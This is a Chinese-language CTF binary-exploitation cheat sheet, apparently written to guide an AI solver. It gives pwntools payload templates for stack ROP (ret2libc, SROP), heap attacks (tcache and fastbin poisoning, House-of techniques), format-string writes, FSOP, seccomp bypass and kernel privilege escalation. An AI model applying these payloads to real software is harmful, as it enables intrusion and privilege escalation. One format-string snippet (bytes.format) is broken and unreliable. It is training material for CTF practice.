# PWN 技术

PWN 是 CTF 中的二进制漏洞利用类别，涵盖各种内存破坏和利用技术。

## PWN 基础

### 环境搭建

**工具安装**：
```bash
# pwntools
pip install pwntools

# pwndbg
git clone https://github.com/pwndbg/pwndbg
cd pwndbg && ./setup.sh

# ROPgadget
pip install ROPgadget

# one_gadget
gem install one_gadget
```

**Docker 环境**：
```bash
docker pull ubuntu:20.04
docker run -it -v $(pwd):/pwn ubuntu:20.04
```

### 基本流程

1. **信息收集**：checksec、file、strings
2. **静态分析**：IDA/Ghidra 逆向
3. **动态调试**：GDB 调试分析
4. **漏洞利用**：编写 exploit
5. **获取 flag**：执行并获取结果

## 栈漏洞

### 栈溢出基础

**ret2text**：
```python
payload = b"A" * offset
payload += p64(backdoor_addr)
```

**ret2shellcode**：
```python
shellcode = asm(shellcraft.sh())
payload = shellcode.ljust(offset, b"A")
payload += p64(buffer_addr)
```

**ret2syscall**：
```python
# execve("/bin/sh", 0, 0)
payload = b"A" * offset
payload += p64(pop_rax) + p64(59)
payload += p64(pop_rdi) + p64(bin_sh)
payload += p64(pop_rsi) + p64(0)
payload += p64(pop_rdx) + p64(0)
payload += p64(syscall)
```

**ret2libc**：
```python
# 泄露 libc
payload1 = b"A" * offset
payload1 += p64(pop_rdi) + p64(puts_got)
payload1 += p64(puts_plt)
payload1 += p64(main_addr)

# 计算 libc 基址
puts_addr = u64(p.recvuntil(b'\n')[-7:-1].ljust(8, b'\x00'))
libc_base = puts_addr - libc.symbols['puts']

# 调用 system
payload2 = b"A" * offset
payload2 += p64(pop_rdi) + p64(bin_sh)
payload2 += p64(system_addr)
```

### ROP 技巧

**ret2csu**：
```python
# 利用 __libc_csu_init 中的 gadgets
# 控制 rdi, rsi, rdx
csu_front = 0x400880
csu_end = 0x40089a

payload = b"A" * offset
payload += p64(csu_end)
payload += p64(0)  # rbx
payload += p64(1)  # rbp
payload += p64(func_got)  # r12 (call)
payload += p64(arg3)  # r13 -> rdx
payload += p64(arg2)  # r14 -> rsi
payload += p64(arg1)  # r15 -> rdi
payload += p64(csu_front)
```

**ret2dlresolve**：
- 伪造符号解析
- 调用任意函数
- 无需 libc 泄露

**SROP**：
```python
sigframe = SigreturnFrame()
sigframe.rax = 59
sigframe.rdi = bin_sh_addr
sigframe.rsi = 0
sigframe.rdx = 0
sigframe.rip = syscall_addr

payload = b"A" * offset
payload += p64(syscall_ret)  # sigreturn
payload += bytes(sigframe)
```

## 堆漏洞

### Fastbin Attack

**Fastbin Dup**：
```python
# Double free
free(chunk1)
free(chunk2)
free(chunk1)  # 再次释放

# 分配到任意地址
malloc(size)  # 返回 chunk1
malloc(size)  # 返回 chunk2
malloc(size)  # 返回 chunk1，可以修改 fd
malloc(size)  # 返回伪造的地址
```

**Fastbin Attack**：
```python
# 修改 fd 指向 target
free(chunk)
edit(chunk, p64(target - 0x10))

# 分配到 target
malloc(size)
malloc(size)  # 返回 target
```

### Tcache Attack

**Tcache Dup**：
```python
# glibc 2.27-2.28 无检查
free(chunk)
free(chunk)  # Double free

malloc(size)
edit(chunk, p64(target))
malloc(size)
malloc(size)  # 返回 target
```

**Tcache Poisoning**：
```python
free(chunk)
edit(chunk, p64(target))
malloc(size)  # 返回 target
```

### Unsorted Bin Attack

**原理**：
- 利用 unsorted bin 的 bk 指针
- 写入 large value 到任意地址

**利用**：
```python
# 修改 unsorted bin 的 bk
edit(chunk, p64(target - 0x10))

# 触发 malloc，写入 main_arena 地址到 target
malloc(large_size)
```

### Large Bin Attack

**原理**：
- 利用 large bin 的 bk_nextsize
- 任意地址写

**利用**：
```python
# 构造 large bin chunk
# 修改 bk_nextsize 指向 target
# 触发 malloc 写入
```

### House 系列

**House of Spirit**：
- 伪造 fastbin chunk
- 控制 free 的目标

**House of Orange**：
- 不使用 free
- 利用 _IO_FILE
- 触发 malloc_printerr

**House of Einherjar**：
- Off-by-one
- 修改 prev_size
- Chunk overlapping

**House of Roman**：
- Fastbin attack
- Unsorted bin attack
- 组合利用

## 格式化字符串

### 基础利用

**泄露栈**：
```python
payload = b"%p " * 20
```

**泄露任意地址**：
```python
payload = p64(target_addr)
payload += b"%7$s"  # 读取 target_addr 指向的内容
```

**任意地址写**：
```python
# 写入 value 到 target
payload = p64(target)
payload += b"%{}c%7$n".format(value)
```

### 高级技巧

**pwntools FmtStr**：
```python
def send_payload(payload):
    p.sendline(payload)
    return p.recvuntil(b"done")

fmt = FmtStr(send_payload)
fmt.write(got_addr, system_addr)
fmt.execute_writes()
```

**栈迁移**：
```python
# 修改 rbp 和返回地址
# 迁移栈到可控区域
```

## IO_FILE 利用

### FSOP

**原理**：
- 劫持 _IO_list_all
- 触发 _IO_flush_all_lockp
- 调用虚表函数

**利用**：
```python
# 伪造 _IO_FILE 结构
fake_file = p64(0)  # flags
fake_file += p64(0)  # _IO_read_ptr
# ... 其他字段
fake_file += p64(vtable_addr)

# 修改 _IO_list_all
# 触发 abort/exit
```

### House of Orange

**无 free 利用**：
1. 通过 top chunk 扩展触发 sysmalloc
2. 将旧 top chunk 放入 unsorted bin
3. 利用 unsorted bin attack 修改 _IO_list_all
4. 伪造 _IO_FILE 结构
5. 触发 _IO_flush_all_lockp

## 沙箱逃逸

### seccomp

**检测**：
```bash
seccomp-tools dump ./binary
```

**绕过**：
- orw（open-read-write）
- 允许的系统调用组合
- 利用 TOCTOU

**orw 模板**：
```python
# open
shellcode = shellcraft.open('/flag')
# read
shellcode += shellcraft.read('rax', 'rsp', 0x100)
# write
shellcode += shellcraft.write(1, 'rsp', 0x100)
```

## 内核 PWN

### 基础

**环境搭建**：
```bash
# 编译内核
# 制作 rootfs
# qemu 启动
qemu-system-x86_64 \
    -kernel bzImage \
    -initrd rootfs.cpio \
    -append "console=ttyS0 quiet" \
    -nographic
```

**调试**：
```bash
# qemu 添加参数
-s -S

# gdb 连接
gdb vmlinux
target remote :1234
```

### 漏洞类型

**UAF**：
- 内核对象 UAF
- 类型混淆
- 控制内核执行流

**栈溢出**：
- 内核栈溢出
- 覆盖返回地址
- ROP 链

**堆溢出**：
- kmalloc 溢出
- slab 利用

### 提权技术

**修改 cred**：
```c
commit_creds(prepare_kernel_cred(0));
```

**ret2usr**：
- 跳转到用户空间代码
- 需要关闭 SMEP

**ROP**：
- 内核 ROP 链
- 绕过 SMEP/SMAP

## 实战技巧

### 调试技巧

**断点**：
```python
# 脚本中暂停
gdb.attach(p, 'b *0x400123')
pause()
```

**查看内存**：
```
x/20gx $rsp
x/20gx $rip
vmmap
heap
bins
```

### 信息泄露

**libc 泄露**：
- puts/printf 泄露 GOT
- unsorted bin 泄露 main_arena
- 计算 libc 基址

**栈泄露**：
- 格式化字符串
- 缓冲区溢出读取

**堆泄露**：
- UAF 读取
- Heap overflow 读取

### 稳定性

**多次尝试**：
```python
while True:
    try:
        exploit()
        break
    except:
        continue
```

**爆破**：
```python
# ASLR 爆破
for i in range(0x1000):
    try:
        exploit(i)
    except:
        continue
```

## 常用 Payload

### One Gadget

**查找**：
```bash
one_gadget libc.so.6
```

**使用**：
```python
one_gadget = libc_base + 0x4527a
payload = b"A" * offset + p64(one_gadget)
```

### Magic Gadget

**__libc_csu_init**：
- 控制多个寄存器
- 调用任意函数

**__libc_start_main**：
- 返回到 main
- 多次利用

---

**AI 发挥空间**：
- 根据题目类型选择合适的利用技术
- 分析保护机制设计绕过方案
- 构造稳定的 exploit
- 开发自动化解题脚本

**反幻觉提示**：
- 不要假设所有题目都有相同的漏洞类型
- 验证目标环境的保护机制和 libc 版本
- 测试 exploit 的稳定性
- 注意不同环境的差异（本地/远程）
- 某些技术可能需要多次尝试或爆破
